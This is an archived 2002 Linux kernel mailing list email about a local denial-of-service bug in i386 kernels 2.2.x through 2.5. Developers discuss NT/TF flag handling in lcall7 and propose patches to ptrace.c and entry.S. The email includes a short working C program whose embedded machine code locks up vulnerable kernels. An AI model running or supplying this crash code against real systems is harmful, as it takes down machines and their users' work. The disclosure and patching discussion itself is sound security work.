Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S261173AbSKQX4d>; Sun, 17 Nov 2002 18:56:33 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S261206AbSKQX4d>; Sun, 17 Nov 2002 18:56:33 -0500
Received: from shuzbut.anathoth.gen.nz ([203.96.153.249]:7342 "EHLO
	shuzbut.anathoth.gen.nz") by vger.kernel.org with ESMTP
	id <S261173AbSKQX4b>; Sun, 17 Nov 2002 18:56:31 -0500
Subject: Re: FW: i386 Linux kernel DoS - Affects 2.2.x and probably 2.0.x
From: Matthew Grant <grantma@anathoth.gen.nz>
To: debian-security@lists.debian.org, linux-kernel@vger.kernel.org,
       bugtraq@lists.securityfocus.com, lwn@lwn.net, alan@redhat.com,
       Herbert Xu <herbert@debian.org>
Content-Type: text/plain
Content-Transfer-Encoding: 7bit
X-Mailer: Ximian Evolution 1.0.7 
Date: 18 Nov 2002 13:03:18 +1300
Message-Id: <1037577803.1093.16.camel@luther>
Mime-Version: 1.0
X-Virus-Scanned-By: Amavis with CLAM Anti Virus on shuzbut.anathoth.gen.nz
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Hi THere!

Fun and REAL games!

I checked the code affected in arch/i386/kernel/entry.S for 2.2.x, and
the lcall7 () call looked vulnerable as it was the same as in 2.4.x, so
that I ran the follwing exploit on 2.2.x, and the machine locked
completely....

I have not check 2.0.x, but given the staleness of this code segment, it
may also be affected.

The fix appears to be to adapt the 2.4.x patch to 2.2.x, which looks
fairly easy to do.

Best Regards,

Matthew Grant

PS: I am a debian developer...


Exploit code from lkml  Andrea Arcangeli <andrea@suse.de>

> we just can't allow userspace to set NT or iret will crash at ret from
> userspace, furthmore there's no useful thing the userspace can do with
> the NT flag.
> 
> here the fix, it applies to all 2.4 and 2.5:
> 
> --- 2.4.20rc1aa2/arch/i386/kernel/ptrace.c.~1~	Fri Aug  9 14:52:06
2002
> +++ 2.4.20rc1aa2/arch/i386/kernel/ptrace.c	Thu Nov 14 03:56:00 2002
> @@ -28,7 +28,7 @@
>  
>  /* determines which flags the user has access to. */
>  /* 1 = access 0 = no access */
> -#define FLAG_MASK 0x00044dd5
> +#define FLAG_MASK 0x00040dd5
>  
>  /* set's the trap flag. */
>  #define TRAP_FLAG 0x100

sorry, this is the wrong fix, it happened to fix the problem for the
only testcase working out there because such a testcase was written in a
way that used ptrace to set the eflags instead of a more simple
pushf popf lcall like this:

int main( void )
{
    char dos[] = "\x9C"                           /* pushfd       */
                 "\x58"                           /* pop eax      */
                 "\x0D\x00\x41\x00\x00"           /* or eax,4100h  */
                 "\x50"                           /* push eax     */
                 "\x9D"                           /* popfd        */
                 "\x9A\x00\x00\x00\x00\x07\x00";  /* call 07h:00h */

    void (* f)( void );

    f = (void *) dos; (* f)();

    return 1;
}

(note the above is differnet to the one posted on bugtraq, the above one
is a simple version of the "working" exploit posted to l-k)

I clearly misunderstood how the nt works, it is read from the in core
eflags, not from the copy on the stack, so my patch won't make any
difference as far as the kernel is concerned and the only problem was
again with lcall, so the right fix is the last one from Petr.  sorry for
the spam.

Andrea







------------- Message from linux-kernel@vger.kernel.org-------------- 


List:     linux-kernel
Subject:  Re: FW: i386 Linux kernel DoS
From:     Krzysiek Taraszka <dzimi@pld.org.pl>
Date:     2002-11-16 19:33:08

On 13 Nov 2002, Alan Cox wrote:

> On Tue, 2002-11-12 at 23:31, Christoph Hellwig wrote:
> > On Tue, Nov 12, 2002 at 02:28:55PM -0900, Leif Sawyer wrote:
> > > This was posted on bugtraq today...
> > 
> > A real segfaulting program?  wow :)
> 
> Looks like the TF handling bug which was fixed a while ago

It wasn't fixed for 2.2.22. 2.2 has got only syscall7, so fix should be 
trivial, isn't ?
Should be look like:


diff -urN linux.orig/arch/i386/kernel/entry.S 
linux/arch/i386/kernel/entry.S
--- linux.orig/arch/i386/kernel/entry.S Tue May 21 01:32:34 2002
+++ linux/arch/i386/kernel/entry.S      Thu Nov 14 21:39:36 2002
@@ -63,7 +63,9 @@
 OLDSS          = 0x38

 CF_MASK                = 0x00000001
+TF_MASK                = 0x00000100
 IF_MASK                = 0x00000200
+DF_MASK                = 0x00000400
 NT_MASK                = 0x00004000
 VM_MASK                = 0x00020000

@@ -139,6 +141,9 @@
        movl CS(%esp),%edx      # this is eip..
        movl EFLAGS(%esp),%ecx  # and this is cs..
        movl %eax,EFLAGS(%esp)  #
+       andl $~(NT_MASK|TF_MASK|DF_MASK), %eax
+       pushl %eax
+       popfl
        movl %edx,EIP(%esp)     # Now we move them to their "normal"
places
        movl %ecx,CS(%esp)      #
        movl %esp,%ebx


or I missing somethink ?

Krzysiek Taraszka			(dzimi@pld.org.pl)

-
To unsubscribe from this list: send the line "unsubscribe linux-kernel"
in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
Please read the FAQ at  http://www.tux.org/lkml/




